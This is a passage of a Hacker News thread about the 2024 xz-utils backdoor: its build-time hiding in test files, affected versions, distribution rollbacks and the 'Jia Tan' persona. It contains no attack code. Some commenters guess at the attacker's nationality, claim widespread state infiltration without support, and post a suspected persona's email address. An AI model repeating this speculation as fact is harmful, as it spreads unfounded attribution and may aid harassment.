xz-utils/5.6.1-0.1 [NMU] -- XZ-format compression utilities Date: Tue, 26 Mar 2024 19:27:47 +0000 Also seeing this bug. Extra valgrind output causes some failed tests for me. Looks like the new version will resolve it. Would like this new version so I can continue work. -- Wow. (Edited for clarity.) | | --- | --- | --- | | | |  |  | [amluto](user?id=amluto) [9 months ago](item?id=39869538)   | [root](#39866275) | [parent](#39866936) | [prev](#39867049) | [next](#39867142) [–]  Wow, what a big pile of infrastructure for a non-optimization. An internal call via ifunc is not magic — it’s just a call via the GOT or PLT, which boils down to function pointers. An internal call through a hidden visibility function pointer (the right way to do this) is also a function pointer. The *even better* solution is a plain old if statement, which implements the very very fancy “devirtualization” optimization, and the result will be effectively predicted on most CPUs and is not subject to the whole pile of issue that retpolines are needed to work around. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39915610)   | [root](#39866275) | [parent](#39869538) | [next](#39867142) [–]  Right, IFUNCs make sense for library function where you have the function pointer indirection anyway. Makes much less sense for internal functions - only argument over a regular function pointer would be the pointer being marked RO after it is resolved (if the library was linked with -z relro -z now), but an if avoids even that issue. | | --- | --- | --- | | | |  |  | [bluecheese33](user?id=bluecheese33) [9 months ago](item?id=39867142)   | [root](#39866275) | [parent](#39866936) | [prev](#39869538) | [next](#39871674) [–]  > because the ifunc code was breaking with all sorts of build options and obviously caused many problems with various sanitizers for example, <https://github.com/google/oss-fuzz/pull/10667> | | --- | --- | --- | | | |  |  | [snvzz](user?id=snvzz) [9 months ago](item?id=39871674)   | [root](#39866275) | [parent](#39866936) | [prev](#39867142) | [next](#39867127) [–]  >Hans Jansen and Jia Tan Are they really two people conspiring? Unless proven otherwise, it is safe to assume one is just a pseudonym alias of the other. | | --- | --- | --- | | | |  |  | [EasyMark](user?id=EasyMark) [9 months ago](item?id=39871990)   | [root](#39866275) | [parent](#39871674) | [next](#39867127) [–]  or possibly just one person acting as two, or a group of people? | | --- | --- | --- | | | |  |  | [cutemonster](user?id=cutemonster) [9 months ago](item?id=39971145)   | [root](#39866275) | [parent](#39871990) | [next](#39867127) [–]  Or a group managing many identities, backdooring many different projects | | --- | --- | --- | | | |  |  | [zb3](user?id=zb3) [9 months ago](item?id=39867127)   | [root](#39866275) | [parent](#39866936) | [prev](#39871674) | [next](#39875001) [–]  Also I see this PR: <https://github.com/tukaani-project/xz/pull/64> | | --- | --- | --- | | | |  |  | [tootie](user?id=tootie) [9 months ago](item?id=39875001)   | [root](#39866275) | [parent](#39866936) | [prev](#39867127) | [next](#39967621) [–]  Does anybody know anything about Jia Tan? Is it likely just a made up persona? Or is this a well-known person. | | --- | --- | --- | | | |  |  | [SZJX](user?id=SZJX) [9 months ago](item?id=39899479)   | [root](#39866275) | [parent](#39875001) | [next](#39967621) [–]  It’s certainly a pseudonym just like all the other personas we’ve seen popping up on the mailing list supporting this “Jia Tan” in these couple of years. For all intents and purposes they can be of any nationality until we know more. | | --- | --- | --- | | | |  |  | [Ill\_Yam\_689](user?id=Ill_Yam_689) [9 months ago](item?id=39967621)   | [root](#39866275) | [parent](#39866936) | [prev](#39875001) | [next](#39867078) [–]  It seems like Hans Jansen has also an account on proton.me (hansjansen162@proton.me) with the Outlook address configured as recovery-email. | | --- | --- | --- | | | |  |  | [jonathanspw](user?id=jonathanspw) [9 months ago](item?id=39867078)   | [parent](#39866275) | [prev](#39866936) | [next](#39869132) [–]  Yesterday sure was fun wasn't it :p Thanks for all your help/working with me on getting this cleaned up in Fedora. | | --- | --- | --- | | | |  |  | [speleding](user?id=speleding) [9 months ago](item?id=39875510)   | [root](#39866275) | [parent](#39867078) | [next](#39871629) [–]  PSA: I just noticed homebrew installed the compromised version on my Mac as a dependency of some other package. You may want to check this to see what version you get: ```    xz --version  ``` Homebrew has already taken action, a `brew upgrade` will downgrade back to the last known good version. | | --- | --- | --- | | | |  |  | [jonahx](user?id=jonahx) [9 months ago](item?id=39875753)   | [root](#39866275) | [parent](#39875510) | [next](#39875576) [–]  I also had a homebrew installed affected version. I understand it's unlikely, but is there anything I can do to check if the backdoor was used? Also any other steps I should take after "brew upgrade"? | | --- | --- | --- | | | |  |  | [tomputer](user?id=tomputer) [9 months ago](item?id=39876159)   | [root](#39866275) | [parent](#39875753) | [next](#39875576) [–]  Quoting[1] from Homebrew on Github: >> Looks like that Homebrew users (both macOS and Linux, both Intel and ARM) are unlikely affected? > Correct. Though we do not appear to be affected, this revert was done out of an abundance of caution. [1] <https://github.com/Homebrew/homebrew-core/pull/167512> | | --- | --- | --- | | | |  |  | [mthoms](user?id=mthoms) [9 months ago](item?id=39875576)   | [root](#39866275) | [parent](#39875510) | [prev](#39875753) | [next](#39883956) [–]  Thanks for this. I just ran brew upgrade and the result was as you described: ```   xz 5.6.1 -> 5.4.6 ``` | | --- | --- | --- | | | |  |  | [pmarreck](user?id=pmarreck) [9 months ago](item?id=39883956)   | [root](#39866275) | [parent](#39875510) | [prev](#39875576) | [next](#39875800) [–]  sorry, what exact version(s) is the one(s) affected again? (or SHAs, etc.) (EDIT: 5.6.0 and 5.6.1 ?) (EDIT 2: Ooof, looks like the nix unstable channel uses xz 5.6.1 at this time) I use Nix to manage this stuff on Mac, not Homebrew... | | --- | --- | --- | | | |  |  | [redxtech](user?id=redxtech) [9 months ago](item?id=39890543)   | [root](#39866275) | [parent](#39883956) | [next](#39875800) [–]  GitHub disabled the xz repo, making it a bit more difficult for nix to revert to an older version. They've made a fix, but it will take several more days for the build systems to finish rebuilding the ~220,000 packages that depend on the bootstrap utils. | | --- | --- | --- | | | |  |  | [kreetx](user?id=kreetx) [9 months ago](item?id=39891980)   | [root](#39866275) | [parent](#39890543) | [next](#39915629) [–]  Here is the discussion <https://github.com/NixOS/nixpkgs/issues/300055> | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39915629)   | [root](#39866275) | [parent](#39890543) | [prev](#39891980) | [next](#39875800) [–]  Lol they shouldn't be relying on GitHub in the first place. | | --- | --- | --- | | | |  |  | [rrrix1](user?id=rrrix1) [9 months ago](item?id=39937920)   | [root](#39866275) | [parent](#39915629) | [next](#39875800) [–]  What should they be relying on instead? Maybe rsync everything to an FTP server? Or Torrents? From your other comments, you seem to think no one should ever use GitHub for anything. | | --- | --- | --- | | | |  |  | [cozzyd](user?id=cozzyd) [9 months ago](item?id=39875800)   | [root](#39866275) | [parent](#39875510) | [prev](#39883956) | [next](#39876542) [–]  Is it actually compromised on homebrew though? I guess we can't be sure but it seemed to be checking if it was being packaged as .deb or .rpm? | | --- | --- | --- | | | |  |  | [erhaetherth](user?id=erhaetherth) [9 months ago](item?id=39876542)   | [root](#39866275) | [parent](#39875510) | [prev](#39875800) | [next](#39871629) [–]  Is 5.2.2 safe? Just 5.6.0 and 5.6.1 are bad? | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39871629)   | [root](#39866275) | [parent](#39867078) | [prev](#39875510) | [next](#39869132) [–]  Is it normal that when I try to uninstall xz it is trying to install lzma? | | --- | --- | --- | | | |  |  | [inetknght](user?id=inetknght) [9 months ago](item?id=39872158)   | [root](#39866275) | [parent](#39871629) | [next](#39869132) [–]  It means that `xz` was depended upon by something that depends on eg "xz OR lzma" | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [9 months ago](item?id=39869132)   | [parent](#39866275) | [prev](#39867078) | [next](#39869580) [–]  *because of it's "great new features"* "great" for whom? I've seen enough of the industry to immediately feel suspicious when someone uses that sort of phrasing in an attempt to persuade me. It's no different from claiming a "better experience" or similar. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39870992)   | [root](#39866275) | [parent](#39869132) | [next](#39870756) [–]  I made a library where version 2 is really really much faster than version 1. I'd want everyone to just move to version 2. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39871109)   | [root](#39866275) | [parent](#39870992) | [next](#39870756) [–]  But then you are saying a specific great new feature, performance, and not just the claim and concept performance, but numbers. | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39872240)   | [root](#39866275) | [parent](#39871109) | [next](#39870756) [–]  I'm sure they actually had new features… | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39872690)   | [root](#39866275) | [parent](#39872240) | [next](#39872372) [–]  What are they specifically? I don't know how you can be missing the essence of the problem here or that comments point. Vague claims are meaningless and valueless and are now even worse than that, they are a red flag. Please don't tell me that you would accept a pr that didn't explain what it did, and why it did it, and how it did it, with code that actually matched up with the claim, and was all actually something you wanted or agreed was a good change to your project. Updating to the next version of a library is completely unrelated. When you update a library, you don't know what all the changes were to the library, \_but the librarys maintainers do\_, and you essentially trust that librarys maintainers to be doing their job not accepting random patches that might do anything. Updating a dependency and trusting a project to be sane is entirely a different prospect from accepting a pr and just trusting that the submitter only did things that are both well intentioned and well executed. If you don't get this then I for sure will not be using or trusting *your* library. | | --- | --- | --- | | | |  |  | [CanaryLayout](user?id=CanaryLayout) [9 months ago](item?id=39872372)   | [root](#39866275) | [parent](#39872240) | [prev](#39872690) | [next](#39870756) [–]  Yeah... RISCV routine was put in, then some binary test files were added later that are probably now suspect. don't miss out on the quality code, like the line that has: i += 4 - 2; [https://git.tukaani.org/?p=xz.git;a=commitdiff;h=50255feeaab...](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=50255feeaabcc7e7db22b858a6bd64a9b5b4f16d;hp=db5eb5f563e8baa8d912ecf576f53391ff861596) | | --- | --- | --- | | | |  |  | [jwilk](user?id=jwilk) [9 months ago](item?id=39873690)   | [root](#39866275) | [parent](#39872372) | [next](#39872563) [–]  FWIW, "4 - 2" is explained earlier in the file: ```   // The "-2" is included because the for-loop will   // always increment by 2. In this case, we want to   // skip an extra 2 bytes since we used 4 bytes   // of input.   i += 4 - 2; ``` | | --- | --- | --- | | | |  |  | [gamer191](user?id=gamer191) [9 months ago](item?id=39872563)   | [root](#39866275) | [parent](#39872372) | [prev](#39873690) | [next](#39870756) [–]  > some binary test files were added later that are probably now suspect That's confirmed From <https://www.openwall.com/lists/oss-security/2024/03/29/4>: > The files containing the bulk of the exploit are in an obfuscated form in > tests/files/bad-3-corrupt\_lzma2.xz > tests/files/good-large\_compressed.lzma > committed upstream. They were initially added in > [https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf...](https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0) | | --- | --- | --- | | | |  |  | [m0dest](user?id=m0dest) [9 months ago](item?id=39873585)   | [root](#39866275) | [parent](#39872563) | [next](#39870756) [–]  It probably makes sense to start isolating build processes from test case resources. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874345)   | [root](#39866275) | [parent](#39873585) | [next](#39870756) [–]  Sure but then you can smuggle it into basically any other part of the build process…? | | --- | --- | --- | | | |  |  | [SilasX](user?id=SilasX) [9 months ago](item?id=39870756)   | [root](#39866275) | [parent](#39869132) | [prev](#39870992) | [next](#39869580) [–]  You can find more examples of that kind of puffer if you go to a website's cookie consent pop-up and find the clause after "we use cookies to...". | | --- | --- | --- | | | |  |  | [transcriptase](user?id=transcriptase) [9 months ago](item?id=39871536)   | [root](#39866275) | [parent](#39870756) | [next](#39869580) [–]  I’ve long thought that those “this new version fixes bugs and improves user experience” patch notes that Meta et al copy and paste on every release shouldn’t be permitted. | | --- | --- | --- | | | |  |  | [nebula8804](user?id=nebula8804) [9 months ago](item?id=39873972)   | [root](#39866275) | [parent](#39871536) | [next](#39880715) [–]  Tell me about it. I look at all these random updates that get pushed to my mobile phone and they all pretty much have that kind of fluff in the description. Apple/Android should take some steps to improve this or outright ban this practice. In terms of importance to them though I imagine this is pretty low on the list. I have dreamed about an automated LLM system that can "diff" the changes out of the binary and provide some insight. You know give back a tiny bit of power to the user. I'll keep dreaming. | | --- | --- | --- | | | |  |  | [Nullabillity](user?id=Nullabillity) [9 months ago](item?id=39920869)   | [root](#39866275) | [parent](#39873972) | [next](#39880715) [–]  It's worse, as someone who *does* try to privide release notes I'm often cut off by the max length of the field. And even *then*, Play only shows you the notes for the latest version of the app. | | --- | --- | --- | | | |  |  | [fl0ki](user?id=fl0ki) [9 months ago](item?id=39880715)   | [root](#39866275) | [parent](#39871536) | [prev](#39873972) | [next](#39869580) [–]  Slack's Mac app release notes [1] rotate a few copy pastes, here's the one that shits me the most. > We tuned up the engine and gave the interiors a thorough clean. Everything is now running smoothly again. Yeah nah mate, if every release is the first release where everything is running smoothly, I'm not going to believe it this time either. Makes me wonder if the team has some release quota to fill and will push a build even if nothing meaningful has actually changed. [1] <https://slack.com/release-notes/mac> | | --- | --- | --- | | | |  |  | [SilasX](user?id=SilasX) [9 months ago](item?id=39885032)   | [root](#39866275) | [parent](#39880715) | [next](#39869580) [–]  Ugh. That's especially annoying because they're trying to be hip with slang and use a metaphor that requires cultural knowledge that you can't really assume everyone has. | | --- | --- | --- | | | |  |  | [mongol](user?id=mongol) [9 months ago](item?id=39869580)   | [parent](#39866275) | [prev](#39869132) | [next](#39867822) [–]  Interesting that one of the commits commented on update of the test file that it was for better reproducibility for having been generated by a fixed random seed (although how goes unmentioned). For the future, random test data better be generated as part of the build, rather than being committed as opaque blobs... | | --- | --- | --- | | | |  |  | [WhyNotHugo](user?id=WhyNotHugo) [9 months ago](item?id=39875370)   | [root](#39866275) | [parent](#39869580) | [next](#39867822) [–]  I agree on principle, but sometimes programmatic generating test data is not so easy. E.g.: I have a specific JPEG committed into a repository because it triggers a specific issue when reading its metadata. It's not just \_random\_ data, but specific bogus data. But yeah, if the test blob is purely random, then you can just commit a seed and generate in during tests. | | --- | --- | --- | | | |  |  | [smeehee](user?id=smeehee) [9 months ago](item?id=39867822)   | [parent](#39866275) | [prev](#39869580) | [next](#39870368) [–]  Debian have reverted xz-utils (in unstable) to 5.4.5 – actual version string is “5.6.1+really5.4.5-1”. So presumably that version's safe; we shall see… | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [9 months ago](item?id=39870831)   | [root](#39866275) | [parent](#39867822) | [next](#39874798) [–]  Is that version truly vetted? "Jia Tan" has been the official maintainer since 5.4.3, could have pushed code under any other pseudonym, and controls the signing keys. I would have felt better about reverting farther back, xz hasn't had any breaking changes for a long time. | | --- | --- | --- | | | |  |  | [tobias2014](user?id=tobias2014) [9 months ago](item?id=39870975)   | [root](#39866275) | [parent](#39870831) | [next](#39870915) [–]  It looks like this is being discussed, with a complication of additional symbols that were introduced <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024> | | --- | --- | --- | | | |  |  | [binkHN](user?id=binkHN) [9 months ago](item?id=39871835)   | [root](#39866275) | [parent](#39870975) | [next](#39870915) [–]  Thanks for this! I found this URL in the thread very interesting! <https://www.nongnu.org/lzip/xz_inadequate.html> | | --- | --- | --- | | | |  |  | [mehdix](user?id=mehdix) [9 months ago](item?id=39872305)   | [root](#39866275) | [parent](#39871835) | [next](#39870915) [–]  It is an excellent technical write-up and yet again another testimonial to the importance of keeping things simple. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [9 months ago](item?id=39872772)   | [root](#39866275) | [parent](#39872305) | [next](#39870915) [–]  The other comments here showing that the backdoor was a long-term effort now make me wonder just *how* long of an effort it was... | | --- | --- | --- | | | |  |  | [rnmkr](user?id=rnmkr) [9 months ago](item?id=39870915)   | [root](#39866275) | [parent](#39870831) | [prev](#39870975) | [next](#39874798) [–]  It's not only that account, other maintainer has been pushing the same promotion all over the place. | | --- | --- | --- | | | |  |  | [sgarland](user?id=sgarland) [9 months ago](item?id=39874798)   | [root](#39866275) | [parent](#39867822) | [prev](#39870831) | [next](#39872902) [–]  TIL that +really is a canonical string. [0] [0]: [https://www.debian.org/doc/debian-policy/ch-controlfields.ht...](https://www.debian.org/doc/debian-policy/ch-controlfields.html#epochs-should-be-used-sparingly) | | --- | --- | --- | | | |  |  | [kzrdude](user?id=kzrdude) [9 months ago](item?id=39872902)   | [root](#39866275) | [parent](#39867822) | [prev](#39874798) | [next](#39870368) [–]  There are suggestions to roll back further | | --- | --- | --- | | | |  |  | [drazk](user?id=drazk) [9 months ago](item?id=39870368)   | [parent](#39866275) | [prev](#39867822) | [next](#39869810) [–]  After reading the original post by Andres Freund, <https://www.openwall.com/lists/oss-security/2024/03/29/4>, his analysis indicates that the RSA\_public\_decrypt function is being redirected to the malware code. Since RSA\_public\_decrypt is only used in the context of RSA public key - private key authentication, can we reasonably conclude that the backdoor does not affect username-password authentication? | | --- | --- | --- | | | |  |  | [cbolton](user?id=cbolton) [9 months ago](item?id=39874007)   | [root](#39866275) | [parent](#39870368) | [next](#39869810) [–]  Isn't it rather that the attacker can log in to the compromised server by exploiting the RSA code path? | | --- | --- | --- | | | |  |  | [api](user?id=api) [9 months ago](item?id=39869810)   | [parent](#39866275) | [prev](#39870368) | [next](#39869325) [–]  I’m surprised there isn’t way more of this stuff. The supply chain is so huge and therefore represents so much surface area. | | --- | --- | --- | | | |  |  | [SoftTalker](user?id=SoftTalker) [9 months ago](item?id=39871349)   | [root](#39866275) | [parent](#39869810) | [next](#39874495) [–]  There probably is. Way more than anyone knows. I bet every major project on github is riddled with state actors. | | --- | --- | --- | | | |  |  | [cozzyd](user?id=cozzyd) [9 months ago](item?id=39874495)   | [root](#39866275) | [parent](#39869810) | [prev](#39871349) | [next](#39869325) [–]  Imagine if sshd was distributed by PyPI or cargo or npm instead of by a distro. | | --- | --- | --- | | | |  |  | [kapouer](user?id=kapouer) [9 months ago](item?id=39869325)   | [parent](#39866275) | [prev](#39869810) | [next](#39871817) [–]  Github accounts of both xz maintainers have been suspended. | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39869355)   | [root](#39866275) | [parent](#39869325) | [next](#39881935) [–]  Not true, the original author wasn't suspended: <https://github.com/Larhzu> <https://github.com/JiaT75> was suspended for a moment, but isn't anymore? | | --- | --- | --- | | | |  |  | [FridgeSeal](user?id=FridgeSeal) [9 months ago](item?id=39871216)   | [root](#39866275) | [parent](#39869355) | [next](#39869381) [–]  GitHub’s UI has been getting notoriously bad for showing consistent and timely information lately, could be an issue stemming from that. | | --- | --- | --- | | | |  |  | [justinclift](user?id=justinclift) [9 months ago](item?id=39871911)   | [root](#39866275) | [parent](#39871216) | [next](#39869381) [–]  Yeah. Had a weird problem last week where GitHub was serving old source code from the raw url when using curl, but showing the latest source when coming from a browser. *Super* frustrating when trying to develop automation. :( | | --- | --- | --- | | | |  |  | [boutique](user?id=boutique) [9 months ago](item?id=39869381)   | [root](#39866275) | [parent](#39869355) | [prev](#39871216) | [next](#39881935) [–]  Both are suspended for me. Check followers on both accounts, both have a suspended pill right next to their names. | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39869490)   | [root](#39866275) | [parent](#39869381) | [next](#39870294) [–]  Ah, thanks for correcting me there - really weird that this isn't visible from the profile itself. Not even from the organization. The following page for each other show both accounts suspended indeed. <https://github.com/Larhzu?tab=following> <https://github.com/JiaT75?tab=following> | | --- | --- | --- | | | |  |  | [miduil](user?id=miduil) [9 months ago](item?id=39917870)   | [root](#39866275) | [parent](#39869490) | [next](#39870294) [–]  Lasse's account was restored | | --- | --- | --- | | | |  |  | [fargle](user?id=fargle) [9 months ago](item?id=39870294)   | [root](#39866275) | [parent](#39869381) | [prev](#39869490) | [next](#39881935) [–]  github should add a badge for "inject backdoor into core open source infrastructure" | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39915981)   | [root](#39866275) | [parent](#39870294) | [next](#39881935) [–]  Hey maybe it would get bad actors to come clean trying to get that badge. | | --- | --- | --- | | | |  |  | [logicziller](user?id=logicziller) [9 months ago](item?id=39881935)   | [root](#39866275) | [parent](#39869325) | [prev](#39869355) | [next](#39871817) [–]  These shouldn't be suspended, and neither should their repositories. People might want to dig through the source code. It's okay if they add a warning on the repository, but suspending \_everything\_ is a stupid thing to do. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39915953)   | [root](#39866275) | [parent](#39881935) | [next](#39871817) [–]  Tools don't read warnings. Of course the information should not be hidden completely but intentionally breaking the download URLs makes sense. | | --- | --- | --- | | | |  |  | [logicziller](user?id=logicziller) [9 months ago](item?id=39965022)   | [root](#39866275) | [parent](#39915953) | [next](#39871817) [–]  This can also be handled relatively easily. They can disable the old links and a new one can be added specifically for the disabled repository. Or even just let the repository be browsable through the interface at least. Simply showing one giant page saying "This respository is disabled" is not helpful in any way. | | --- | --- | --- | | | |  |  | [thayne](user?id=thayne) [9 months ago](item?id=39871817)   | [parent](#39866275) | [prev](#39869325) | [next](#39872141) [–]  Do you know if it was actually the commit author, of if their commit access was compromised? | | --- | --- | --- | | | |  |  | [bpye](user?id=bpye) [9 months ago](item?id=39871918)   | [root](#39866275) | [parent](#39871817) | [next](#39872141) [–]  If it was a compromise it also included the signing keys as the release tarball was modified vs the source available on GitHub. | | --- | --- | --- | | | |  |  | [LispSporks22](user?id=LispSporks22) [9 months ago](item?id=39872141)   | [parent](#39866275) | [prev](#39871817) | [next](#39866612) [–]  Nice. I worked on a Linux disto when I was a wee lad and all we did was compute a new md5 and ship it. | | --- | --- | --- | | | |  |  | [gigatexal](user?id=gigatexal) [9 months ago](item?id=39866612)  [flagged]  | [parent](#39866275) | [prev](#39872141) | [next](#39881069) [10 more]  Name and shame this author. They should never be allowed anywhere near any open projects ever again. | | --- | --- | --- | | | |  |  | [0xbadcafebee](user?id=0xbadcafebee) [9 months ago](item?id=39866989)   | [root](#39866275) | [parent](#39866612) | [next](#39866696) [–]  Please don't? 1. You don't actually know what has been done by whom or why. You don't know if the author intended all of this, or if their account was compromised. You don't know if someone is pretending to be someone else. You don't know if this person was being blackmailed, forced against their will, etc. You don't really know much of anything, except a backdoor was introduced by somebody. 2. Assuming the author did do something maliciously, relying on personal reputation is bad security practice. The majority of successful security attacks come from insiders. You have to trust insiders, because *someone* has to get work done, and you don't know who's an insider attacker until they are found out. It's therefore a best security practice to limit access, provide audit logs, sign artifacts, etc, so you can trace back where an incursion happened, identify poisoned artifacts, remove them, etc. Just saying "let's ostracize Phil and hope this never happens again" doesn't work. 3. A lot of today's famous and important security researchers were, at one time or another, absolute dirtbags who did bad things. Human beings are fallible. But human beings can also grow and change. Nobody wants to listen to reason or compassion when their blood is up, so nobody wants to hear this right now. But that's why it needs to be said now. If someone is found guilty beyond a reasonable doubt (that's really the important part...), then name and shame, sure, shame can work wonders. But at some point people need to be given another chance. | | --- | --- | --- | | | |  |  | [gigatexal](user?id=gigatexal) [9 months ago](item?id=39867326)   | [root](#39866275) | [parent](#39866989) | [next](#39872884) [–]  100% fair -- we don't know if their account was compromised or if they meant to do this intentionally. If it were me I'd be doing damage control to clear my name if my account was hacked and abused in this manner. Otherwise if I was doing this knowing full well what would happen then full, complete defederation of me and my ability to contribute to anything ever again should commence -- the open source world is too open to such attacks where things are developed by people who assume good faith actors. | | --- | --- | --- | | | |  |  | [gigatexal](user?id=gigatexal) [9 months ago](item?id=39867550)   | [root](#39866275) | [parent](#39867326) | [next](#39872884) [–]  upon further reflection all 3 of your points are cogent and fair and valid. my original point was a knee-jerk reaction to this. :/ | | --- | --- | --- | | | |  |  | [Biganon](user?id=Biganon) [9 months ago](item?id=39869748)   | [root](#39866275) | [parent](#39867550) | [next](#39872884) [–]  Your being able to reflect upon it and analyze your own reaction is rare, valuable and appreciated | | --- | --- | --- | | | |  |  | [gigatexal](user?id=gigatexal) [9 months ago](item?id=39874413)   | [root](#39866275) | [parent](#39869748) | [next](#39872884) [–]  I think I went through all the stages of grief. Now at the stage of acceptance here’s what I hope: I hope justice is done. Whoever is doing this be they a misguided current black hat (hopefully, future white hat) hacker, or just someone or someones that want to see the world burn or something in between that we see justice. And then forgiveness and acceptance and all that can happen later. Mitnick reformed after he was convicted (whether you think that was warranted or not). Here if these folks are Mitnick’s or bad actors etc let’s get all the facts on the table and figure this out. What’s clear is that we all need to be ever vigilant: that seemingly innocent patch could be part of a more nefarious thing. We’ve seen it before with that university sending patches to the kernel to “test” how well the core team was at security and how well that went over. Anyways. Yeah. Glad you all allowed me to grow. And I learned that I have an emotional connection to open source for better or worse: so much of my life professional and otherwise is enabled by it and so threats to it I guess I take personally. | | --- | --- | --- | | | |  |  | [Kwpolska](user?id=Kwpolska) [9 months ago](item?id=39872884)   | [root](#39866275) | [parent](#39866989) | [prev](#39867326) | [next](#39866696) [–]  It is reasonable to consider all commits introduced by the backdoor author untrustworthy. This doesn't mean all of it is backdoored, but if they were capable of introducing this backdoor, their code needs scrutiny. I don't care why they did it, whether it's a state-sponsored attack, a long game that was supposed to end with selling a backdoor for all Linux machines out there for bazillions of dollars, or blackmail — this is a serious incident that should eliminate them from open-source contributions and the xz project. There is no requirement to use your real name when contributing to open source projects. The name of the backdoor author ("Jia Tan") might be fake. If it isn't, and if somehow they are found to be innocent (which I doubt, looking at the evidence throughout the thread), they can create a new account with a new fake identity. | | --- | --- | --- | | | |  |  | [Lichtso](user?id=Lichtso) [9 months ago](item?id=39866696)   | [root](#39866275) | [parent](#39866612) | [prev](#39866989) | [next](#39881069) [–]  They might have burnt the reputation built for this particular pseudonym but what is stopping them from doing it again? They were clearly in it for the long run. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39866945)   | [root](#39866275) | [parent](#39866696) | [next](#39881069) [–]  You're assuming that it's even a single person, it's just a gmail address and an avatar with a j icon from a clip art thing. | | --- | --- | --- | | | |  |  | [Lichtso](user?id=Lichtso) [9 months ago](item?id=39867183)   | [root](#39866275) | [parent](#39866945) | [next](#39881069) [–]  I literally said "they", I know, I know, in English that can also be interpreted as a gender unspecific singular. Anyways, yes it is an interesting question whether he/she is alone or they are a group. Conway's law probably applies here as well. And my hunch in general is that these criminal mad minds operate individually / alone. Maybe they are hired by an agency but I don't count that as a group effort. | | --- | --- | --- | | | |  |  | [nodesocket](user?id=nodesocket) [9 months ago](item?id=39881069)   | [parent](#39866275) | [prev](#39866612) | [next](#39916560) [–]  Can legal action be taken against the author if it's found he maliciously added the backdoor? | | --- | --- | --- | | | |  |  | [saltedtangerine](user?id=saltedtangerine) [9 months ago](item?id=39907722)   | [root](#39866275) | [parent](#39881069) | [next](#39916560) [–]  Good luck with that. We don't even know what country is he from. Probably from China but even if so. Good luck finding him among 1.5 Billions. | | --- | --- | --- | | | |  |  | [landownersubgrp](user?id=landownersubgrp) [9 months ago](item?id=39916560)   | [parent](#39866275) | [prev](#39881069) | [next](#39866745) [–]  It is not good to take into consideration something with any unreadable text instead of the open text of the programme. It should be excluded. | | --- | --- | --- | | | |  |  | [yieldcrv](user?id=yieldcrv) [9 months ago](item?id=39866745)   | [parent](#39866275) | [prev](#39916560) | [next](#39909917) [–]  I wonder who the target was! | | --- | --- | --- | | | |  |  | [juliusdavies](user?id=juliusdavies) [9 months ago](item?id=39871753)   | [root](#39866275) | [parent](#39866745) | [next](#39878675) [–]  Every Linux box inside AWS, Azure, and GCP and other cloud providers that retains the default admin sudo-able user (e.g., “ec2”) and is running ssh on port 22. I bet they intended for their back door to eventually be merged into the base Amazon Linux image. | | --- | --- | --- | | | |  |  | [throwaway7356](user?id=throwaway7356) [9 months ago](item?id=39876509)   | [root](#39866275) | [parent](#39871753) | [next](#39874273) [–]  You don't need a "ec2" user. A backdoor can just allow root login even when that is disabled for people not using the backdoor. It just requires the SSH port to be reachable unless there is also a callout function (which is risky as people might see the traffic). And with Debian and Fedora covered and the change eventually making its way into Ubuntu and RHEL pretty much everything would have this backdoor. | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39874273)   | [root](#39866275) | [parent](#39871753) | [prev](#39876509) | [next](#39878675) [–]  my understanding is that any Debian/RPM-based Linux running sshd would become vulnerable in a year or two. The best equivalent of this exploit is the One Ring. So the really strange thing is why they put so little effort into making this undetectable. All they needed was to make it use less time to check each login attempt. | | --- | --- | --- | | | |  |  | [kevincox](user?id=kevincox) [9 months ago](item?id=39875597)   | [root](#39866275) | [parent](#39874273) | [next](#39878675) [–]  In the other hand it was very hard to detect. The slow login time was the only thing that gave it away. It more seems like they were so close to being highly successful. In retrospect improving the performance would have been the smart play. But that is one part that went wrong compared to very many that went right. | | --- | --- | --- | | | |  |  | [njsg](user?id=njsg) [9 months ago](item?id=39878675)   | [root](#39866275) | [parent](#39866745) | [prev](#39871753) | [next](#39872177) [–]  Distro build hosts and distro package maintainers might not be a bad guess. Depends on whether getting this shipped was the final goal. It might have been just the beginning, part of some bootstrapping. | | --- | --- | --- | | | |  |  | [swagmoney1606](user?id=swagmoney1606) [9 months ago](item?id=39872177)   | [root](#39866275) | [parent](#39866745) | [prev](#39878675) | [next](#39909917) [–]  Probably less of an individual and more of an exploit to sell. | | --- | --- | --- | | | |  |  | [menomatter](user?id=menomatter) [9 months ago](item?id=39909917)   | [parent](#39866275) | [prev](#39866745) | [next](#39867115) [–]  his account is active again on github <https://github.com/JiaT75> | | --- | --- | --- | | | |  |  | [KingOfCoders](user?id=KingOfCoders) [9 months ago](item?id=39867115)   | [parent](#39866275) | [prev](#39909917) | [next](#39866433) [–]  Sleeper. | | --- | --- | --- | | | |  |  | [coding123](user?id=coding123) [9 months ago](item?id=39866433)   | [parent](#39866275) | [prev](#39867115) | [next](#39866999) [9 more]  [flagged] | | --- | --- | --- | | | |  |  | [zb3](user?id=zb3) [9 months ago](item?id=39866472)   | [root](#39866275) | [parent](#39866433) | [next](#39866999) [–]  Not sure why are people downvoting you... it's pretty 